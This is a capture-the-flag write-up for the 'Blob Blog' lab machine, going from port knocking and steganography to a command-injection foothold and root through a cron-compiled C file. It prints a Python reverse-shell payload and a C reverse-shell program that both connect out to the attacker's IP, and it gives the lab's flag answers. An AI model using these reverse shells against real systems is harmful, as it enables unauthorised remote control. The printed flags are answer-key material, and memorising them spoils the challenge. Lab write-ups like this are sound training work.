**The Blob Blog**

Successfully hack into bobloblaw's computer. Can you root the box?

# User Flag

## Services enumeration

Nmap discovers 2 running services:

~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web (port 80)

When connecting to port 80, we are greeted with a standard Ubuntu Apache page, but it contains encoded comments. The first comment is in the beginning of the source code:

~~~
kali@kali:/data/The_Blob_Blog/files$ curl -s http://10.10.8.67/ | head -n 11

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
K1stLS0+[REDACTED]XT4tLg==
-->
~~~

The string is encoded twice, with base64 and with brainfuck. It decodes to:

~~~
When I was a kid, my friends and I would always knock on 3 of our neighbors doors.  Always houses 1, then 3, then 5!
~~~

This is an indication of a port knocking sequence, that we will explore just after.

Now, let's have a look at the second comment, at the end of source code:

~~~
kali@kali:/data/The_Blob_Blog$ curl -s http://10.10.8.67 | tail
    </p>
    </div>
  </body>
<!--
Dang it Bob, why do you always forget your password?
I'll encode for you here so nobody else can figure out what it is: 
HcfP8J54AK4
-->
</html>
~~~

This is a base58 encoded password which decodes to: `cUpC4k3s`.

Further enumerating the web server doesn't reveal any hidden location.

## Port knocking

The first comment gives us the port knocking sequence (ports 1, 2, 3) that we can compose using `nc` as follows:

~~~
$ for x in 1 3 5; do nc -w 1 -z 10.10.8.67 $x; done
~~~

It has unlocked new ports:

~~~
PORT     STATE    SERVICE VERSION
21/tcp   open     ftp     vsftpd 3.0.2
22/tcp   open     ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 e7:28:a6:33:66:4e:99:9e:8e:ad:2f:1b:49:ec:3e:e8 (DSA)
|   2048 86:fc:ed:ce:46:63:4d:fd:ca:74:b6:50:46:ac:33:0f (RSA)
|   256 e0:cc:05:0a:1b:8f:5e:a8:83:7d:c3:d2:b3:cf:91:ca (ECDSA)
|_  256 80:e3:45:b2:55:e2:11:31:ef:b1:fe:39:a8:90:65:c5 (ED25519)
80/tcp   open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
445/tcp  open     http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5355/tcp filtered llmnr
8080/tcp open     http    Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
~~~

## Web (Port 445)

Connecting to port 445 shows a page that contains a password in clear (`p@55w0rd`), hidden in a comment:

~~~
kali@kali:/data/The_Blob_Blog$ curl -s http://10.10.8.67:445 | head -n 12

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2014-03-19
    See: https://launchpad.net/bugs/1288690
  -->
<!--
Bob, I swear to goodness, if you can't remember p@55w0rd 
It's not that hard
-->
~~~

Further enumerating the web server on port 445 reveals a hidden `/user` location:

~~~
kali@kali:/data/The_Blob_Blog$ gobuster dir -u http://10.10.8.67:445/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.8.67:445/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 10:58:15 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/user (Status: 200)
===============================================================
2020/09/03 10:58:37 Finished
===============================================================
~~~

This leads to an SSH private key which seems to be scrambled.

~~~
kali@kali:/data/The_Blob_Blog$ curl -s http://10.10.8.67:445/user
-----BEGIN OPENSSH PRIVATE KEY-----
KSHyMzjjE7pZPFLIWrUdNridNrips0Gtj2Yxm2RhDIkiAxtniSDwgPRkjLMRFhY=
7lR2+1NLc2iomL7nGRbDonO9qZrh0a5ciZAta4XdfH9TsYx6be6LeA5oD3BKd1bIDaVO0Q
SqV+NFG7hyfwGaAGtfm+q0O3y8Hkn8n8l9vYU/7EHiy5jb9zVN5Eg8iCU7ueD3F8yG7og7

[REDACTED]

qmr7NBB2lodUoPqBhD4Zv1aOMkMcA9NgbHe+0rXBUTNsy8jQXWhZb5bX38NjFtTDLWLDY/
SsIPFLIlJLIFFLIvJLxhJ0WuO9aQ4q5EkaZL11kAqbef2d5oWjkYVtQ3MhRx7mEyKbb+zu
q3GwjcSkiR1wKFzyorTFLIPFMO5kgxCPFLITgx9cOVLIPFLIPFLJPFLKUbLIPFohr2lekc
-----END OPENSSH PRIVATE KEY-----
~~~

I tried several transformations against this key, but I didn't succeed in producing a valid key. Maybe a rabbit hole?

## FTP

We can connect against the FTP service as `bob` with one of the passwords gathered previously (`p@55w0rd`). Two files are available, but only the image under the `files` directory is interesting.

~~~
kali@kali:/data/The_Blob_Blog$ ftp 10.10.8.67
Connected to 10.10.8.67.
220 (vsFTPd 3.0.2)
Name (10.10.8.67:kali): bob
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 1001     1001         4096 Jul 25 14:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 14:08 ..
-rw-r--r--    1 1001     1001          220 Jul 25 14:07 .bash_logout
-rw-r--r--    1 1001     1001         3771 Jul 25 14:07 .bashrc
-rw-r--r--    1 1001     1001          675 Jul 25 14:07 .profile
-rw-r--r--    1 1001     1001         8980 Jul 25 14:07 examples.desktop
dr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 ftp
226 Directory send OK.
ftp> cd ftp
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
dr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 .
dr-xr-xr-x    3 1001     1001         4096 Jul 25 14:08 ..
drwxr-xr-x    2 1001     1001         4096 Jul 28 16:05 files
226 Directory send OK.
ftp> cd files
250 Directory successfully changed.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 Jul 28 16:05 .
dr-xr-xr-x    3 65534    65534        4096 Jul 25 14:08 ..
-rw-r--r--    1 1001     1001         8183 Jul 28 16:05 cool.jpeg
226 Directory send OK.
ftp> get cool.jpeg
local: cool.jpeg remote: cool.jpeg
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for cool.jpeg (8183 bytes).
226 Transfer complete.
8183 bytes received in 0.00 secs (65.5791 MB/s)
ftp> exit
221 Goodbye.
~~~

Using `steghide` with the base58 encoded password gathered previously (`cUpC4k3s`), we can reveal a secret:

~~~
kali@kali:/data/The_Blob_Blog/files$ steghide extract -sf cool.jpeg 
Enter passphrase: 
wrote extracted data to "out.txt".
kali@kali:/data/The_Blob_Blog/files$ cat out.txt 
zcv:p1fd3v3amT@55n0pr
/bobs_safe_for_stuff
~~~

After trying the `/bobs_safe_for_stuff` location on all available web services, I eventually found that it was available for port 445, but it is not really useful. 

~~~
kali@kali:/data/The_Blob_Blog/files$ curl -s http://10.10.8.67:445/bobs_safe_for_stuff
Remember this next time bob, you need it to get into the blog! I'm taking this down tomorrow, so write it down!
- youmayenter
~~~

On the other hand, the string `zcv:p1fd3v3amT@55n0pr` decodes to `bob:d1ff3r3ntP@55w0rd` using the "Vigenere" cipher with a Beaufort variant and the password `youmayenter`. 

## Web (port 8080)

This port hosts a minimalistic custom blog with several locations:

~~~
kali@kali:/data/The_Blob_Blog/files$ gobuster dir -u http://10.10.8.67:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.8.67:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/03 11:05:39 Starting gobuster
===============================================================
/blog (Status: 302)
/login (Status: 200)
/review (Status: 302)
/blog1 (Status: 302)
/blog2 (Status: 302)
/blog3 (Status: 302)
/blog4 (Status: 302)
/blog5 (Status: 302)
/blog6 (Status: 302)
~~~

Connecting to http://10.10.8.67:8080/login with `bob:d1ff3r3ntP@55w0rd` (credentials gathered on the FTP service) leads to a page with links to the 6 blog pages, the review page, and a form to post a review.

The form doesn't sanitize the user input and actually execute the commands we enter. We can use this to post a reverse shell as follows:

~~~
POST /blog HTTP/1.1
Host: 10.10.8.67:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.8.67:8080/blog
Content-Type: application/x-www-form-urlencoded
Content-Length: 236
Connection: close
Upgrade-Insecure-Requests: 1

review=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.50.72",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
~~~

Now, open a listener (`rlwrap nc -nlvp 4444`) and browse the review page:

~~~
$ curl -s http://10.10.8.67:8080/review
~~~

You now have a reverse shell.

## Lateral move

### bobloblaw's files

Unfortunately, we can't read the user flag, likely located in `bobloblaw`'s home because of our limited permissions.

~~~
www-data@bobloblaw-VirtualBox:/home$ ls -la
ls -la
total 16
drwxr-xr-x  4 root      root      4096 Jul 25 14:07 .
drwxr-xr-x 25 root      root      4096 Jul 28 17:13 ..
dr-xr-xr-x  3 bob       bob       4096 Jul 25 14:08 bob
drwxrwx--- 16 bobloblaw bobloblaw 4096 Aug  6 14:51 bobloblaw
~~~

Listing the files owned by `bobloblaw` reveals an interesting binary:

~~~
www-data@bobloblaw-VirtualBox:/home$ find / -type f -user bobloblaw 2>/dev/null
/usr/bin/blogFeedback
~~~

### Reverse Engineering

Download the binary and analyze it in your prefered disassembler (IDA Pro, Hopper, Ghidra, ...).

As depicted below on the graph overview, there are several sections, highlighted with different colors:

* **Orange**: the programs starts by checking the number of arguments. If the program is run without the 6 required arguments, it will stop.
* **Yellow**: if the number of arguments is correct, the program will loop through the arguments 1 by 1 (counter named `i` in the below code) and check that `arg[i] = 7-i` at offset `0x11CB`. In other terms, the 1st arg should be equal to 6, the 2nd one to 5, the 3rd one to 4, ...
* **Green**: if the loop completes, a shell will be spawn by a call to `system('/bin/sh')` at offset `0x1218`.

![ida-pro-graph-overview.png](files/ida-pro-graph-overview.png)

```asm
.text:0000000000001165 ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:0000000000001165                 public main
.text:0000000000001165 main            proc near               ; DATA XREF: _start+1D↑o
.text:0000000000001165
.text:0000000000001165 var_20          = qword ptr -20h
.text:0000000000001165 num_args        = dword ptr -14h
.text:0000000000001165 counter_i       = dword ptr -4
.text:0000000000001165
.text:0000000000001165                 push    rbp
.text:0000000000001166                 mov     rbp, rsp
.text:0000000000001169                 sub     rsp, 20h
.text:000000000000116D                 mov     [rbp+num_args], edi
.text:0000000000001170                 mov     [rbp+var_20], rsi
.text:0000000000001174                 cmp     [rbp+num_args], 6
.text:0000000000001178                 jle     short loc_1180  ; num_args > 6
.text:000000000000117A                 cmp     [rbp+num_args], 7
.text:000000000000117E                 jle     short loc_1196  ; num_args <= 7
.text:0000000000001180
.text:0000000000001180 loc_1180:                               ; CODE XREF: main+13↑j
.text:0000000000001180                 lea     rdi, s          ; "Order my blogs!"
.text:0000000000001187                 call    _puts
.text:000000000000118C                 mov     eax, 0
.text:0000000000001191                 jmp     locret_1222
.text:0000000000001196 ; ---------------------------------------------------------------------------
.text:0000000000001196
.text:0000000000001196 loc_1196:                               ; CODE XREF: main+19↑j
.text:0000000000001196                 mov     [rbp+counter_i], 1 ; num_args = 7 (including prgm name)
.text:0000000000001196                                         ; i = 1
.text:000000000000119D                 jmp     short loc_11E6
.text:000000000000119F ; ---------------------------------------------------------------------------
.text:000000000000119F
.text:000000000000119F loc_119F:                               ; CODE XREF: main+85↓j
.text:000000000000119F                 mov     eax, [rbp+counter_i]
.text:00000000000011A2                 cdqe
.text:00000000000011A4                 lea     rdx, ds:0[rax*8]
.text:00000000000011AC                 mov     rax, [rbp+var_20]
.text:00000000000011B0                 add     rax, rdx
.text:00000000000011B3                 mov     rax, [rax]
.text:00000000000011B6                 mov     rdi, rax        ; nptr
.text:00000000000011B9                 mov     eax, 0
.text:00000000000011BE                 call    _atoi
.text:00000000000011C3                 mov     edx, 7
.text:00000000000011C8                 sub     edx, [rbp+counter_i] ; edx = 7-i
.text:00000000000011CB                 cmp     eax, edx        ; arg[i] = 7-i ?
.text:00000000000011CD                 jz      short loc_11E2
.text:00000000000011CF                 lea     rdi, aHmmIDisagree ; "Hmm... I disagree!"
.text:00000000000011D6                 call    _puts
.text:00000000000011DB                 mov     eax, 0
.text:00000000000011E0                 jmp     short locret_1222
.text:00000000000011E2 ; ---------------------------------------------------------------------------
.text:00000000000011E2
.text:00000000000011E2 loc_11E2:                               ; CODE XREF: main+68↑j
.text:00000000000011E2                 add     [rbp+counter_i], 1 ; i+=1
.text:00000000000011E6
.text:00000000000011E6 loc_11E6:                               ; CODE XREF: main+38↑j
.text:00000000000011E6                 cmp     [rbp+counter_i], 6
.text:00000000000011EA                 jle     short loc_119F  ; while i<6
.text:00000000000011EC                 lea     rdi, aNowThatICanGet ; "Now that, I can get behind!"
.text:00000000000011F3                 call    _puts
.text:00000000000011F8                 mov     esi, 3E8h       ; euid
.text:00000000000011FD                 mov     edi, 3E8h       ; ruid
.text:0000000000001202                 mov     eax, 0
.text:0000000000001207                 call    _setreuid
.text:000000000000120C                 lea     rdi, command    ; "/bin/sh"
.text:0000000000001213                 mov     eax, 0
.text:0000000000001218                 call    _system
.text:000000000000121D                 mov     eax, 0
```

When run with the correct arguments, the program spawns a shell as `bobloblaw`:

~~~
www-data@bobloblaw-VirtualBox:/home$ /usr/bin/blogFeedback 6 5 4 3 2 1
/usr/bin/blogFeedback 6 5 4 3 2 1
id
uid=1000(bobloblaw) gid=33(www-data) groups=33(www-data)
~~~

## User flag

Now that we have a shell run as `bobloblaw`, we are able to get the user flag, located in the `Desktop` directory:

~~~
SHELL=/bin/bash script -q /dev/null
bobloblaw@bobloblaw-VirtualBox:/home$ cd bobloblaw
cd bobloblaw
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw$ cd Desktop
cd Desktop
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ ls -la
ls -la
total 40
drwxrwx---  3 bobloblaw bobloblaw  4096 Jul 28 15:08 .
drwxrwx--- 16 bobloblaw bobloblaw  4096 Aug  6 14:51 ..
-rw--w----  1 bobloblaw bobloblaw 11054 Jul 24 22:23 dontlookatthis.jpg
-rw--w----  1 bobloblaw bobloblaw 10646 Jul 24 22:29 lookatme.jpg
drwxrwx---  2 root      root       4096 Jul 28 14:18 .uh_oh
-rw--w----  1 bobloblaw bobloblaw   109 Jul 27 23:06 user.txt
bobloblaw@bobloblaw-VirtualBox:/home/bobloblaw/Desktop$ cat user.txt
cat user.txt
THM{C0NGR4t$_g3++ing_this_fur}

@jakeyee thank you so so so much for the help with the foothold on the box!!
~~~

User flag: `THM{C0NGR4t$_g3++ing_this_fur}`

At this stage, we can download the SSH private key located in `/home/bobloblaw/.ssh/id_rsa` to directly connect via SSH.

~~~
kali@kali:/data/The_Blob_Blog/files$ chmod 400 id_rsa.1 
kali@kali:/data/The_Blob_Blog/files$ ssh -i id_rsa.1 bobloblaw@10.10.8.67
The authenticity of host '10.10.8.67 (10.10.8.67)' can't be established.
ECDSA key fingerprint is SHA256:XWhnhV1b5xOqN3oCOn971jPiQdc+/idlaY1U83aeaoM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.8.67' (ECDSA) to the list of known hosts.
Last login: Tue Jul 28 15:33:52 2020 from 192.168.69.241
bobloblaw@bobloblaw-VirtualBox:~$
~~~

# Root Flag

## Rabbit holes

### Crontab

Checking the crontab shows an interesting entry, executed by `root`, and containing a vulnerability (tar with wildcard). Unfortunately, the `.uh_oh` directory is not accessible to us:

~~~
www-data@bobloblaw-VirtualBox:/home$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *  * * * root    cd / && run-parts --report /etc/cron.hourly
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

*  *    * * *   root    cd /home/bobloblaw/Desktop/.uh_oh && tar -zcf /tmp/backup.tar.gz *
~~~

### Pictures

There are 2 pictures located on the Desktop:

~~~
bobloblaw@bobloblaw-VirtualBox:~/Desktop$ ls -la
total 40
drwxrwx---  3 bobloblaw bobloblaw  4096 Jul 28 15:08 .
drwxrwx--- 16 bobloblaw bobloblaw  4096 Aug  6 14:51 ..
-rw--w----  1 bobloblaw bobloblaw 11054 Jul 24 22:23 dontlookatthis.jpg
-rw--w----  1 bobloblaw bobloblaw 10646 Jul 24 22:29 lookatme.jpg
drwxrwx---  2 root      root       4096 Jul 28 14:18 .uh_oh
-rw--w----  1 bobloblaw bobloblaw   109 Jul 27 23:06 user.txt
~~~

The first one contains a secret that we can extract with steghide (without password) and decode, but it doesn't help.

~~~
kali@kali:/data/The_Blob_Blog/files$ steghide extract -sf dontlookatthis.jpg 
Enter passphrase: 
wrote extracted data to "dontlook.txt".
kali@kali:/data/The_Blob_Blog/files$ cat dontlook.txt 
NDkgMjAgNzQgNmYgNmMgNjQgMjAgNzkgNmYgNzUgMjAgNmUgNmYgNzQgMjAgNzQgNmYgMjAgNmMgNmYgNmYgNmIgMjE=
kali@kali:/data/The_Blob_Blog/files$ cat dontlook.txt | base64 -d
49 20 74 6f 6c 64 20 79 6f 75 20 6e 6f 74 20 74 6f 20 6c 6f 6f 6b 21
kali@kali:/data/The_Blob_Blog/files$ cat dontlook.txt | base64 -d | xxd -r
 told you not to
~~~

The second picture also contains a secret that we can extract the same way.

~~~
kali@kali:/data/The_Blob_Blog/files$ steghide extract -sf lookatme.jpg 
Enter passphrase: 
wrote extracted data to "whatscooking.txt".
kali@kali:/data/The_Blob_Blog/files$ cat whatscooking.txt 
01001011 01111001 01110011 01110010 01001011 [REDACTED]
~~~

Once decoded (binary > base64 > brainfuck), it shows the following message:

~~~
The stove's timer is about to go off... there are some other timers too...
~~~

### Privileges

Checking `bobloblaw`'s privileges reveals that we can execute commands as `root` without password, but nothing is found on GTFOBins for these binaries.

~~~
bobloblaw@bobloblaw-VirtualBox:~/Desktop$ sudo -l
Matching Defaults entries for bobloblaw on bobloblaw-VirtualBox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bobloblaw may run the following commands on bobloblaw-VirtualBox:
    (root) NOPASSWD: /bin/echo, /usr/bin/yes
~~~

## boring program

You have probably noticed the message `You haven't rooted me yet? Jeez` poping all minutes. Running `pspy64` will reveal the following scheduled task:

~~~
2020/09/07 08:45:02 CMD: UID=0    PID=6375   | gcc /home/bobloblaw/Documents/.boring_file.c -o /home/bobloblaw/Documents/.also_boring/.still_boring 
~~~

This task is executed by `root` and compiles the below C source located in our home directory (`/home/bobloblaw/Documents/.boring_file.c`). 

```c 
#include <stdio.h>
int main() {
  printf("You haven't rooted me yet? Jeez\n");
  return 0;

}
```

The resulting binary (`/home/bobloblaw/Documents/.also_boring/.still_boring`) is also executed every minute. Let's replace the content of the file with a root shell:

```c
/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "10.8.50.72"
#define REMOTE_PORT 4444

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```

Open a listener and wait 1 minute to have a root shell:

~~~
kali@kali:/data/The_Blob_Blog/files$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.50.72] from (UNKNOWN) [10.10.8.67] 54050
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
~~~

## Root flag

And now, let's get the root flag:

~~~
ls -la
total 44
drwx------  7 root root 4096 Jul 29 22:16 .
drwxr-xr-x 25 root root 4096 Jul 28 17:13 ..
lrwxrwxrwx  1 root root    9 Jul 29 22:16 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jul 27 21:20 .cache
drwxr-xr-x  6 root root 4096 Jul 27 20:21 .config
drwxr-xr-x  3 root root 4096 Jul 24 17:00 .local
drwxr-xr-x  2 root root 4096 Jul 24 22:53 .nano
drwxr-xr-x  2 root root 4096 Jul 28 17:56 .patch
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Jul 24 22:53 .selected_editor
-r--r-----  1 root root   28 Jul 26 10:13 root.txt
cat root.txt
THM{G00D_J0B_G3++1NG+H3R3!}
~~~

Root flag: `THM{G00D_J0B_G3++1NG+H3R3!}`
